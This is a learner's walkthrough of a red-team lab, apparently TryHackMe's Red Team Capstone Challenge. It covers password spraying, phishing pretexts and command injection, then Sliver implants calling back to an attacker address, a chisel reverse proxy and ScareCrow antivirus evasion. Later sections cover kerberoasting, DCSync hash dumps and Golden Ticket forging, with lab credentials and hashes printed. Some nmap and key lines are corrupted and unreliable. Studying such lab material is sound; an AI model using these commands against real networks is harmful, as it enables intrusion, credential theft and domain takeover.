# Red-Team-Capstone-Challenge Helped-Through

Name: Red Team Capstone Challenge 
Date:  
Difficulty:  Hard
Goals:  
- Red Teaming with the any Community 
	- Subbed to 0xTiberious, Tyler Ramsbey
	- Joined the Work Harder Group
- Get as many feasible perspectives and tricks
- Watch the speed run 
- Get the badge!
Learnt:
- Limitations and pitfall of Wordlist generators 
- Wordlist generator alternative tools
- Setup Local Email for Red Reasons
- Alh4zr3d's Phishing and Spearphishing SE leafy-bug strategy 
- `fping` is better than `ping`
- ScareCrow 
- Sliver is awesome
- C2 Workflow
- AD CS abuse 101
- [Windows Loves Passwords](https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-adaccountpassword?view=windowsserver2022-ps)
- Multiple Ways means Multiple bypasses to other users
- Cyber-Cold-Warfare with the rest of the community
- RDP inception gets a bit silly - forgetting that you are connecting back on yourself for fifth layer when you already have a session  


![](october.png)

## General Disclaimers

General disclaimers,

- This is more a documentation of my experiences and following along with Streamers and other community member where-ever could. I am not submit this as a Write-Up per-say I did do some of problem solving on occasions throughout, but this is more to understand how to step up to Red-Teaming and dealing with Enterprise sized networks. I am here to learn and have no really possibility of getting this done entirely solo without a lot of time off work and more capabilities, which I do not have. I am hope to earn and learn some here - absolutely have
- There will be memes
- There will be off piste discussion of regarding researching concepts for this
- There will be my trails and successes
- This is also exploratory - some very not good Opsec and some much better Opsec
- Warning the last section contains my and only my opinions of Snowden.   

- [[Red-Team-Capstone-Challenge-Notes.md]]
- [[Red-Team-Capstone-Challenge-CMD-by-CMDs.md]]
- [[Red-Team-Capstone-Challenge-Credentials]]

## Contents


#### Content Creators I watched during this ...

- [Alh4zr3d3 - Youtube](https://www.youtube.com/@alh4zr3d3) / [alh4zr3d3 - Twitch](https://www.twitch.tv/videos/1817405607) 
	- Self-Description: *"I am a professional penetration tester, red teamer, CTF player, and all-around hacker who enjoys sharing his dissociated knowledge and tainted magicks with the greater infosec community as well as drawing new members to the crazed, esoteric cult of hacking."*
- [0xTib3rius - Youtube](https://www.youtube.com/@Tib3rius) / [0xTib3rius - Twitch](https://www.twitch.tv/0xtib3rius)
	- Self-Description: *"I am a professional penetration tester, specializing in web application security. I wrote [AutoRecon](https://github.com/tib3rius/AutoRecon), a tool for enumerating boot2root style boxes, and I have created two Privilege Escalation courses on [Udemy](https://udemy.com/user/Tib3rius)."*
- [Tyler Ramsbey - Youtube](https://www.youtube.com/@TylerRamsbey) / [hack_smarter Twitch](https://www.twitch.tv/hack_smarter) 
	- Self-Description: *"I post videos on cybersecurity, education, leadership, and all things pertaining to the world of IT!"*
	- [Full Youtube playlist](https://www.youtube.com/watch?v=xrh3g5VjY6Y&list=PLMoaZm9nyKaOrmj6SQH2b8lP6VN7Z4OD-)


#### My Map

![](Red-Team-Capstone-Challenge-map.excalidraw.md)

Firstly connecting to have a pretend domain squated email.
![](cooltext.png)


## OSINT  

Message from Am03baM4n
![](messagefromAmoebaman1.png)

Alh4zr3d initial steps while enumerating in the background begin with `crackmapexec`.
```
crackmapexec <proto> 10.200.116.0/24 -u '' -p ''
```

![](cme-init.png)

![](webroot.png)
- Aimee Walker & Patrick Edwards.

Harvesting usernames http://10.200.116.13/october/index.php/demo/meettheteam -> linked to http://10.200.116.13/october/themes/demo/assets/images/ 
```bash
curl http://10.200.116.13/october/themes/demo/assets/images/ -o images
cat images| cut -d '"' -f 8 | grep '.jpeg' | sed 's/.jpeg//g' > users.txt
echo "aimee.walker" >> users.txt
echo "patrick.edwards" >> users.txt
```

I tried injection techniques against the To Do Lists
![](sendacvtothereserve.png)

Learnt how to configure Thunderbird and a brian nugde  of how DNS is part of resolving MX record - @0xTib3rius 
![](thunderbirdconfig.png)

Our first email
![](ourfirstemail.png)

Inital innocuous email - Alh4zr3d went for targeting Lynda because here physical and privileged access to the C-Suite. We change outgoing server
![](changedoutgoingserver.png)
My email sent - remvoed brenda, leslie and martin as they broke the sending process:
![](innocuous-email-one.png)

Al gets Charlene almost instantly. It is possible that got filtered due words I have used.
![](iaminneedofagoodbank.png)

![](charleneresponds.png)

Try to push the mental buttons of panic on the pretend email scripts.
![](tryingthepanicbuttons.png)

[Business Unit](https://en.wikipedia.org/wiki/Strategic_business_unit)
![](businessunit.png)

Alh4zr3d wants to pick a domain to impersonate, but typo-squating is not as affective as email services  will alert the user to if the email is an external email.

Pretext
1. Reason to reach out to a person
2. Reason that the target is expecting to recieve emails

![](bopscrkused.png)

A funny stream moment I missed because of sleep.
![](wouldhavebeenfunlive.png)

More recon and trying out password generators later
```bash
# 
gobuster vhost -u http://thereserve.loc -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -o vhosts.gb
#
gobuster dir -u http://mail.thereserve.loc -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  mail-dirs-raftsmallwords.gb
# $WORD from password_base_list
mp32 --custom-charset1='!@#$%^' $WORD?d?1 >> mp32-passwd.lst
# Hydra the SMTP server
hydra -L lists/emails.txt -P mp32-passwd.lst mail.thereserve.loc smtp
```

Then credentials 
![](hydrathepasswords1.png)

[[Red-Team-Capstone-Challenge-Credentials]]

Inspired by response time talking point about burpsuite pro - Poor Man's Reponse Curlculator
```bash
#!/bin/bash

if [ "$#" -ne 0 ]; then
        echo "Usage: $0 no arguments required as you are required to paste in full curl commands"
        exit
fi

echo "Inital full curl command is required"
echo ""
read -p 'Paste in your first full payload now: ' CURL1
echo ""
echo "Second full curl command is required..."
echo ""
read -p 'Paste in your first full payload now: ' CURL2

TIME0=$(date +"%T.%N")
echo "Sending first curl to $CURL1"
$CURL1
wait
TIME1=$(date +"%T.%N")
echo ""
sleep 3
TIME2=$(date +"%T.%N")
echo "Sending first curl to $CURL1"
$CURL2
wait
TIME3=$(date +"%T.%N")
echo ""
echo ""
echo ""
echo ""
echo "First curl started at: $TIME0"
echo "First curl ended at: $TIME1"
echo "Second curl started at: $TIME2"
echo "Second curl ended at: $TIME3"
exit
```

Just as I was catching up on the progress made by at [Tyler](https://www.youtube.com/watch?v=xrh3g5VjY6Y&t=5277s) this point he discovers a VPN key. Unlike Al or Tibs who went with a target approach - Web server and Email server plus password spray. Tyler went for a similiar approach to I originally set out with holistic scan and enumerate anything and everything and list out threads of where to pull of the next stages of the overall engagement.

I guess corperation just like leaving free vpn keys lying around on the vpn gateway..
![1080](thefaceofamanwhohasfoundvpnfreetouse.png)

Without having paid much attention just verifying steps made. 
![1080](vpnkeydirectory.png)

This could also indicate a naming convention for vpn key that we may steal from the employees to by able to securely pivot through the later firewalls. Remember to always read and fix where required
![](remembertofix.png)
And fixing it we get a legitmate way in. 
![](corpUserinterface.png)

Quick test to figure out username format. 
![](usernameformattingdeduction.png)

Given that Tyler does know what `-e` flag for nmap does and I also want to be more red team given there are firewalls and EDRs and all that. Using nmap could be a bad idea. To solve this I checked if `-sS`  would show up as nmap packet that can be parsed as such
![](doublechecksshasnonmap.png)

While I was being to overthink the addressing part
![](vpninternalnetworksexplained.png)
It is just in the vpn output. 

```bash
sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,3.116.5000,9.116.-e tun0 172.32.5.21/32

sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,3.116.5000,9.116.-e tun0 172.32.5.22/32
# The alternative would be to try resolve over netbios 
# 
sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,3.116.5000 --min-rate 200 -e tun0 12.100.1.0/24 -v

sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,.116.443,445,464,636,3306,3.116.5000 --min-rate 200 -e tun0 # -v


```

A temporary wordlist to the wordlist problem of problems solution for < 38K words. 
```bash
cat /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt && cat /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt #&& cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt |  sort -u > betterRaftandDirb.txt
```

There is a vpns directory to fuzz. If we have a username format we can fuzz it. I forgot to reset the network and then the vpn key.

Alh4zr3d goes full sliver and re-introduces me to the wonder of [ScareCrow](https://github.com/optiv/ScareCrow) - need to play with this 

- https://github.com/BishopFox/sliver/wiki/Pivots
- https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/

Tyler references [Orange-Cyberdefense Mindmaps](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg), which is a extensive mindmap of AD attacks.

At this point after watching [Alh4zr3d live](https://www.twitch.tv/videos/1823317510) I decided to approach this by preparing to be able to bypass EDR, AV first before continuing with The VPN route. I want to follow both methods and check Tib3rious's way in before getting the second domain controller. As objective go the main problem is that I neither have to time or experience over the coming weeks to dedicate to bypassing EDR for the first time without some tried a true way. I acknowledge the hand-holding to success with dedicating a significant amount of write and research work for my Archive Project to learn as much from others sturggles. To save myself time in the future struggle of HTB ProLabs that I will hopeful do next year. Guessing that Tyler will probably gain a foothold I started by considering my options before going through other paths with [Part 2 of Tyler RTCC video](https://www.youtube.com/watch?v=TUyYUSr0O_Y). [am03bam4n](https://tryhackme.com/p/am03bam4n) was present on this stream and explained that the VPN instability is reflective of the real world - what I took from this is that actually we need away from using the corpusername.ovpn as soon as possible. 

`fping` is better than `ping`
```bash
# show alive target, provide stats, generating a list as -f not provided - with quiet - no per-target/ping results
fping -asgq
```

Best time to do this in the real world is to do this first thing in the morning local to the on-premise office.
```bash
sudo responder -I tun0
```

Network Manage CLI tool
```bash
nmcli 
```

Tyler went deep into the web application:
![](wehaveuserenum.png)

Password Mangling - instead of the extensive ChatGPT usage I went for search engines - https://github.com/NotSoSecure/password_cracking_rules.git, because although AI is great as a service it is not is commonly wrong, but the tone of authority and some of the syntax used is both irratating and also really dangerous. It is very sure it is correct that it search the internet better that you. Also it is slow and filtering for "safety". And to top it off there are better open source version that I need to look into before all the sad tech companies failing to hit profit try to restrict the entire market and eco-system to save themselves not everyone else. Continuing on with [Part 3 with Tyler](https://www.youtube.com/watch?v=svdhIyifHC8) and [Finishing the AV evasion stream for the knowledge](https://www.twitch.tv/videos/1823317510)...but Al had a rough time and I 

```bash
# Download the OneRuleToRuleThemAll
curl -L https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule -o OneRuleToRuleThemAll.rule  
# Remove the case insensitive duplicates to save 300k  
cat password_base_list.txt | uniq -i > better_base_password_list.txt
# Create a wordlist with hashcat to improve my cheatsheets 
hashcat --force better_base_password_list.txt -r ../OneRuleToRuleThemAll.rule --stdout > Bpbl-ORTRTA.txt
# Reduce by another 10k word for 309K words
cat Bpbl-ORTRTA.txt | uniq > Bpbl-ORTRTA.txt
```

laura.wood@thereserve.loc : Password1@ for the [[Red-Team-Capstone-Challenge-Credentials]], but I already have that from a previous attempt, but ... it is 240574 in the smaller OneRuleToRuleThemAll list, so this better for password cracking than spraying. A win for `mp32 --custom-charset1='!@#$%^' $WORD?d?1 >> mp32-passwd.lst`
![](laurais240574.png)

[37:54](https://www.youtube.com/watch?v=svdhIyifHC8) - My VPN or the server is already patched behind someone already ahead of me.

Press submit for free VPN keys
![](laurawoodvpnlogin.png)

WE ARE MOHAMMAD - rdp access finally!!!
![](wearemohammad.png)

![](wehaveping.png)
Then the machine shutdown.

## Perimeter Breach

Then al finds cmd injection
![](alhappywecansleeptheserver.png)

My suspicions of the multitude of hole in the bank to poke at are many
![1080](alfindcmdi.png)

Password in DB connect
![](dbconnect.png)

vpn : password1!

![](sudolvpnserver.png)

![](lisamorepass.png)

lisa.moore : Scientist2006

[gtfobins cp](https://gtfobins.github.io/gtfobins/cp/#sudo)
```
LFILE=file_to_write
echo "DATA" | sudo cp /dev/stdin "$LFILE"
```

Al wants to pivot, but then wants to overwrite ssh. Sshimple is better
```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/zc3tx/DGZGDr7KWUlAzH5stPT7oySNhZqe+1snxmByRA7kiIIp8tly12x7vxFCvwhf7R7Sp1qR0Pzi5S5uAGO//+YD4ukVDtzA0F0oi2KjWsGZB5I0HUp7QERY8nb9yL3rfTC6HIMF0cCBUU0zNkVnCSYeZDG7WePSp7lblIOBmHd54a+3UAaShQc8Fadk0IQchW8MAvRcyQM7J0F2fT/aPTmUbv77VrUWFapgwuUBydXZA9eu+YOn9y1g5ID3QL6UpVHjNAjXPw1byRiyMRPUZcCL9No5fNa7Lu3e6xqB7qvgT20CQuohkpckWBroFoitG/K0VVsFFwQWaXvZGLwKJtvBwscDVIcFdoqfUO9JNNZ9G0Q97t1CZTuT9vRLvlRyOp1gir/iE45hCzchmpz8SM4RvGo8gvpnKWy8//noDas6nXqRxwvAEKe2S4nbSFBD5Xt7gTOH1gukutcN0TDQ+Iw0tYNXpHnIgKzhx/CseyPd+1KPhbTtq5T44W9yc=" > authorized_keys
sudo cp authorized_keys /root/.ssh/authorized_keys
```

![](cpintoroot.png)

Went on a bit of tangent with how Proxychains works; SSH tunnel - but we are on a multi-hacker network so everyone using ssh is a really danger.

```bash
cat vpn-interal-thm-free-packed-lunch-in-the-lands.nmap | grep 'scan report' | awk '{print $6}' | tr -d '()' > ~/RedTeamCapStoneChallenge/internalHosts.txt
# Local network information
route
arp -a
```

![](vpnarpcache.png)

Persistence just in case of other people using the same vectors
```go
// For VPN
generate --mtls 10.50.113.184:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
generate beacon --mtls 10.50.113.184:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
mtls -L 10.50.113.184 -l 11011
mtls -L 10.50.113.184 -l 11012
// Drop on VPN
nohup ./VPN-update &
nohup ./VPN-upgrade &
```

Setup up chisel server to handle a Dynamic Reverse Proxy 
```bash
./chisel server -host 10.50.113.184 -p 20000 --reverse --socks5 -v
# On the VPN
nohup ./chisel client 10.50.113.184:20000  R:20001:socks &
# comment sock4 ... and add to /etc/proxychains4.conf:
socks5  127.0.0.1 20001
```

Proxychains and chisel proof
![](proxychainandchiselsetupcomplete.png)

lisa.moore credentials have been 
![](passwordchangeon103.png)

Bloodhound run with `--dns-tcp` uses dns over tcp which works better over `proxychains`, but this did not work for Al. 
```go
generate beacon --mtls 10.50.113.184:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
// ScareCrow to bypass Windows Defender - shoot fly with bozaka
./ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain google.com
// Deploy implant

// Run .NET assembly in its own process - without a beacon object file!
execute-assembley -i 
```

Download with `Google Chrome` from RDP session

Covenant is .Net framework meaning that if we unhook AMSI Windows Defender is bypassed from then on

SharpHound.ps1 works

Crying out the credential changing, Tiberious struggles till he get `admin : password1!`
![](tibsisinontheweb.png)

Shakestech recommends [https://github.com/iphelix/dnschef](https://github.com/iphelix/dnschef)

## Initial Compromise of Active Directory

Message from Am03baM4n
![](messagefromAmoebaman2.png)
```bash
proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.116.02 -u 'lisa.moore' -p 'Scientist2006'
```

I added 2 screenshosts to [[RTCC-BH-Notes-Corp]] - and then kerberoasted the dc

```bash
proxychains4 impacket-GetUserSPNs -dc-ip 10.200.116.02 -request 'corp.thereserve.loc/laura.wood'
```

![](kerberoastagasm.png)

The svcScanning spn is crackable

![](bigbypass.png)

- Procdump did not work (or more likely my brain), but did not get detected. I decide to go for armory tools to escalate first rather than trying to dump lsass, presume that either previous compromises would have left artefacts and 

[Thanks to Cyber attack & defense](https://www.youtube.com/watch?v=izMMmOaLn9g) , 
```go
// Display help
help <command>

// For multi-client
multiplayer 
new-operator
// Connect with Client

// With Administrative and adble to get SeDebugPrivilege - by default uses spool.svc to getsystem 
getsystem

// psexec is embedded into sliver good for lateral movement
psexec --profile BEACON <hostname>

// Beacons
// Drop down to select with arrow keys
use 
// Create an interactive sessions
interactive
execute -o <command>


session -i $id

// Shell
// Exit shell, be patient wait 30 seconds
exit
```

Sliver beacon detection:
```powershell 
# Requires Sysmon2
# look for default nomanclature, but this is easily customised -save /path/name.exe
WORD_WORD.exe 

powershell.exe -NoExit -Command[Console]::OutputEncoding=[Text:UTF8Encoding]:UTF8
# by default uses spool.svc to getsystem 
spool.svc
```

`Cyberchef` -> `Regular Expresssion -> Regex: Sliver`  then upload file that you suspect is a Sliver binary. Make sure you set the recipe first or you will crash your browser.

```json
// Language MUST BE: lucene
event.code:8 AND winlog.event_data.TargetImage:(*spoolsv*) AND winlog.event_data.TargetUser:(*
NT* AND *AUTHORITY\\SYSTEM*)
```

reg query the WDIGEST
```go
execute -o reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential
```


```go
interactive
sessions -i <id>
sharpup audit
execute -o icacls "c:\Backup Service"
```

We have full control of the backup service 
![](backupyourpathboyoswearepathhijackrinoingthewrk1.png)

```go
execute -o sc query state= all
// COPY and PASTE stop :set paste in vim sometimes...
xsel -b > WRK1-sc-qc.output 
```

![](foundthebackupservice.png)

Sadly I got 193 error meaning that I could perform the path hijack and the serviceName service outputs error 5 meaning I need administrator.  Some [seatbelt commmands](https://github.com/GhostPack/Seatbelt)
```go
// 
seatbelt -h 
seatbelt UAC // need admin
seatbelt LAPS // LAPS not enabled
seatbelt Services 
// And serviceName is admininstrator
seatbelt Autoruns
//   HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
//  C:\Windows\system32\SecurityHealthSystray.exe
seatbelt WindowsVault // 0
seatbelt WindowsDefender // No exclusions
seatbelt WindowsAutoLogon // Autologons
seatbelt ScheduledTasks // None that run outside of System32
seatbelt powershell // We can downgrade to bypass AMSI
```

#### Just checking

![](wrk1system32icacls.png)

#### What we can do

-  We can downgrade to bypass AMSI
![](wrk1powershelldowngradeasap.png)

#### What we could consider

-  Mimikatz no laps all bypassing WinDefend still required
	- `seatbelt DpapiMasterKeys` - use `sekurla:dpapi` module
- Python311

#### Seatbelt required: the Hound brings back the biscuits

At this point I went over my Bloodhound information, then kerberoasted svc accounts.

[Hashcat 13100](https://hashcat.net/wiki/doku.php?id=example_hashes) or krb5tgs with john
```bash
sudo apt install ntpdate
sudo ntpdate $dc_ip

john corp.spns --format=krb5tgs --wordlist=~/RedTeamCapStoneChallenge/lists/mp32-passwd.lst
- Password1!
```

#### Return for Cthulu Cthursday

Returning the day after because of work with [Al](https://www.twitch.tv/videos/1829218217), [Tyler Ramsbey Part 4](https://www.youtube.com/watch?v=qr8eGM1zhV8) and [Tyler Ramsbey Part 5](https://www.youtube.com/watch?v=FRUQMg9IhMA) in the background 
```bash
proxychains4 impacket-GetUserSPNs -dc-ip 10.200.116.02 -request 'corp.thereserve.loc/mohammad.ahmed' -outputfile krbs-2/corp.spns
# Extract usernames
cat corp.spns | awk -F$ '{print $4}' | sed 's/*//g' >> ~/RedTeamCapStoneChallenge/lists/users.txt

svcScanning : Password1!

proxychains4 python3 /opt/BloodHound.py/bloodhound.y --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.116.02 -u 'svcScanning' -p 'Password1!'

impacket-ticketConverter $ticket.ccache $ticket.kirbi

export KRB5CCNAME=$(pwd)/$ticket.ccache
```

My Bloodhound data was very different so I ran it again..but then we can psremote into server01!
![](wecanpsremoteintoserver1.png)

## Full Compromise of CORP Domain

#### Return to take the next 17 flags!

Watching [Alh4zr3d](https://www.twitch.tv/videos/1829218217) Stream here and there.
```bash
/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin -Loader binary -domain bing.com -obfu
# Became:
/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
# cd to  directory and build
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
# permissions, mv binary to rename back to Sliver generation name of the self-signed cert
# UPX!
upx 
# I lost 60% of the binary size, not even using brute!
```

I then tried kerberoasting from within my Beacon, which is just more awesomeness
![](sliverrubeuskerberoast.png)
Also it supports RC4_HMAC so we can create Skeleton Keys like the mid 2010s APT. 

And following back along with Al once re-re-re-re-hacked to the same point and improved my Sliver cheatsheet
![](svcScanningactuallypwned.png)

[Alh4zr3d](https://www.twitch.tv/videos/1829218217) comes in with cme flags - Domain Cache Credentials - LSA are cached credentials stored in the registry. If 
```bash
# You have local admin
proxychains4 crackmapexec smb 10.200.116.31 -u 'svcScanning' -p 'Password1!' --lsa
```

This was an awesome moment as it opened a lot for me to do without [Alh4zr3d](https://www.twitch.tv/videos/1829218217)
![](cmeserv1lsaof.png)
See [[Red-Team-Capstone-Challenge-Credentials]], the log from `cme` was not complete
Actual password of 
- `svcBackups@corp.thereserve.loc:q9nzssaFtGHdqUV3Qv6G`

If you have local administrator access you can decrypt these passwords in the registry, which stored encrypted it is just that we have access to the encryption that it is trivial to decrypt.
![](svcbackuphasdcsync-bh.png)

Easiest way to get detected in the modern times of red teaming
- Try to set wdigest registry key - All EDR monitor for this apparently.
- Avoid touching the lsass process
- Unhooking has alerts

For the screenshot after multiple days.. of not press play on the VoD
![](svcbackupconfirmation.png)

I DC synced to experience it and to collect the hashes.
```bash
proxychains4 impacket-secretsdump -just-dc -dc-ip 10.200.116.102 corp.thereserve.loc/svcBackups@10.200.116.102 -outputfile dcsync-dump.hashes

Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3d4edcc015856e386074795aea86b3e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c.116.0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::
THMSetup:1008:aad3b435b51404eeaad3b435b51404ee:0ea3e204f310f846e282b0c7f9ca3af2:::
lisa.moore:1125:aad3b435b51404eeaad3b435b51404ee:e4c1c1ba3b6dbdaf5b08485ce9cbc1cf:::
lisa.jenkins:1126:aad3b435b51404eeaad3b435b51404ee:94ef2aa6af7f6397e4164b40afb86eef:::
charlotte.smith:1127:aad3b435b51404eeaad3b435b51404ee:1f9b5ecdf08d6f0c39a2255d99de7c6a:::
...
# For just krbtgt
proxychains4 impacket-secretsdump -just-dc-user CORP/krbtgt -dc-ip 10.200.116.102 corp.thereserve.loc/svcBackups@10.200.116.102 -outputfile dcsync-dump.hashes
# Generate any kerberos ticket for any account 
0c757a3445acb94a654554f3ac529ede
```

Gold Ticket creation:

Requirements:
- KRBTGT account's password hash
- domain name, domain SID, and user ID of account to be impersonated

- With KRBTGT user hash - we don't need the password hash of the account we want to impersonate, it was signed by the KRBTGT hash, this verification passes and the TGT is declared valid no matter its contents.
- KDC will only validate the user account specified in the TGT **if the account is older than 20 minutes**
	- Allowing for disabled, deleted, or non-existent account in the TGT 
- TGT no older than 20 minutes!
- TGT sets the policies and rules, Golden Tickets can overwrite the KDC 
- By default, the KRBTGT account's password never changes
	- Blue team would have to rotate the KRBTGT account password atleast twice, is an incredibly painful process for the blue team
		- Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won't auto-request a new TGT.
- Golden Tickets allow even bypass smart card authentication as smart cards are verified by the DC before it creates the TGT.
- Golden ticket can created non-domain joined machines!

T0_Josh.sutton is a DA on CORP.THERESERVE.LOC
```json
// T0_JOSH.SUTTON
CORP.THERESERVE.LOC : domain name,
S-1-5-21-170228521-1485475711-3199862024-1853 : user ID, // -1853
S-1-5-21-170228521-1485475711-3199862024 : domain SID
```

```c
kerberos::golden /admin:t0_josh.sutton /domain:CORP.THERESERVE.LOC /id:1853 /sid:S-1-5-21-170228521-1485475711-3199862024/krbtgt:0c757a3445acb94a654554f3ac529ede /endin:600 /renewmax:10080 /ptt
```

-   **/admin** - The username we want to impersonate. This does not have to be a valid user.  
-   **/domain** - The FQDN of the domain we want to generate the ticket for.  
-   **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  
-   **/sid** -The SID of the domain we want to generate the ticket for.
-   **/krbtgt** -The NTLM hash of the KRBTGT account.  
-   **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)  
-   **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)  
-   **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session now

With Rubeus
```csharp
//  ______        _
// (_____ \      | |
//  _____) )_   _| |__  _____ _   _  ___
// |  __  /| | | |  _ \| ___ | | | |/___)
// | |  \ \| |_| | |_) ) ____| |_| |___ |
// |_|   |_|____/|____/|_____)____/(___/


// krbtgt:aes256-cts-hmac-sha1-96.116.f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055
// krbtgt:aes128-cts-hmac-sha1-96:7b3bb3c8cb4d2088bcf66834e1ee25d7
// krbtgt:des-cbc-md5:4c7f49bc8c43ae5b

// T0_JOSH.SUTTON
CORP.THERESERVE.LOC : domain name,
S-1-5-21-170228521-1485475711-3199862024-1853 : user ID, // -1853
S-1-5-21-170228521-1485475711-3199862024 : domain SID

// Inside of Sliver 
Rubeus golden /aes256.116.f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055 /ldap /user:t0_josh.sutton /printcmd
```

The actual output
```go

[server] sliver (EAGER_PUT) > rubeus golden /aes256.116.f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055 /ldap /user:t0_josh.sutton /printcmd

[*] rubeus output:

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Build TGT

[*] Trying to query LDAP using LDAPS for user information on domain controller CORPDC.corp.thereserve.loc
[*] Searching path 'DC=corp,DC=thereserve,DC=loc' for '(samaccountname=t0_josh.sutton)'
[*] Retrieving group and domain policy information over LDAP from domain controller CORPDC.corp.thereserve.loc
[*] Searching path 'DC=corp,DC=thereserve,DC=loc' for '(|(distinguishedname=CN=Tier 0 Admins,OU=Groups,DC=corp,DC=thereserve,DC=loc)(objectsid=S-1-5-21-170228521-1485475711-3199862024-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\corpdc.corp.thereserve.loc\SYSVOL
[*] \\corpdc.corp.thereserve.loc\SYSVOL successfully mounted
[*] Attempting to unmount: \\corpdc.corp.thereserve.loc\SYSVOL
[*] \\corpdc.corp.thereserve.loc\SYSVOL successfully unmounted
[*] Retrieving netbios name information over LDAP from domain controller CORPDC.corp.thereserve.loc
[*] Searching path 'CN=Configuration,DC=thereserve,DC=loc' for '(&(netbiosname=*)(dnsroot=corp.thereserve.loc))'
[*] Building PAC

[*] Domain         : CORP.THERESERVE.LOC (CORP)
[*] SID            : S-1-5-21-170228521-1485475711-3199862024
[*] UserId         : 1853
[*] Groups         : .116.513
[*] ServiceKey     :.116.F996A627A04466DA18A4C09D0D7E9A26EDF5667518EE1AF1E21DF7E88E055
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         :.116.F996A627A04466DA18A4C09D0D7E9A26EDF5667518EE1AF1E21DF7E88E055
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : corp.thereserve.loc

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 't0_josh.sutton@corp.thereserve.loc'

[*] AuthTime       : 5/28/2023 12:03:39 PM
[*] StartTime      : 5/28/2023 12:03:39 PM
[*] EndTime        : 5/28/2023 10:03:39 PM
[*] RenewTill      : 6/4/2023 12:03:39 PM

[*] base64(ticket.kirbi):

      doIFmTCCBZWgAwIBBaEDAgEWooIEajCCBGZhggRiMIIEXqADAgEFoRUbE0NPUlAuVEhFUkVTRVJWRS5M
      T0OiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE2NvcnAudGhlcmVzZXJ2ZS5sb2OjggQUMIIEEKADAgESoQMC
      AQOiggQCBIID/uqaUxvD07+l5m5U1UwGFIJqwDpTiCnslA+4ai8sDfmnLn5OG1eSDp6ozVZAgMaHlxBE
      tu4CDINkbNENf4dyEsMHC+/GbobuFIcF5boHIx4Ihz8AZGmU6vHHwMCDypY9NQAISntFd/lRRFtoJVMW
      LnfPv8TTcy4V4aCf7WLPmwASMW/AsBmGKRti4Znn2Xr6fYQMiotIC+USe3grWeMOmdn8uI1tt0V+/znr
      UpjOqSvyJSUcK+rE0Zl7mptG+wsw9QLMpq42WjuDOv/TDRMd5iqtBdFycjh5bx86oA4MElx8rvhSFSfO
      FTKnjR6BfyEcNOb6Xhsikhxos4vAHj8MNPBwGMJWVJLxqt2E6qOlIUikZpV92IEb8S8Z5XfUE8fXYHOr
      x59LzswwBsMVrrdzH8yh49pcNR1du8nL1C8Ppu5WoHbDVsF8rICwg1zG8WG2fbH1fnRteRxqYxUZEc2w
      B/hCysp3wEWPKEkruR9sMH86J/PwsmTkrdxNGp/ZuUyoVx4xAha+KMDYmxi5kHdNvRTnh8FgtUhaySqk
      Yzx5ASgMllMpjYLvfp65gQGKcoQwchOm8t6vnnRhYkKGl2R811QE+xDvufzyU0vDEVuNHdErQeS7e6GL
